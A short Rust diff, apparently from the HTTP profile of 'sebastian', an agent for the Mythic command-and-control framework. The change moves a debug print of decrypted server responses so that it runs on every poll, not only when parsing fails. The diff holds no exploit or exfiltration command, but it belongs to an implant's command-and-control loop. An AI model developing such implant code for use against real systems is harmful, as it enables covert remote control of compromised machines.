@@ -429,6 +429,8 @@ impl Profile for HttpProfile {
 
             // Send and process response
             if let Some(response_bytes) = self.send_message(&msg_json).await {
+                eprintln!("[sebastian] Decrypted response (first 500): {}",
+                    String::from_utf8_lossy(&response_bytes[..response_bytes.len().min(500)]));
                 match serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                 {
                     Ok(mythic_response) => {
@@ -438,8 +440,6 @@ impl Profile for HttpProfile {
                     }
                     Err(e) => {
                         eprintln!("[sebastian] Failed to parse poll response: {}", e);
-                        eprintln!("[sebastian] Raw response (first 500): {}",
-                            String::from_utf8_lossy(&response_bytes[..response_bytes.len().min(500)]));
                     }
                 }
             }
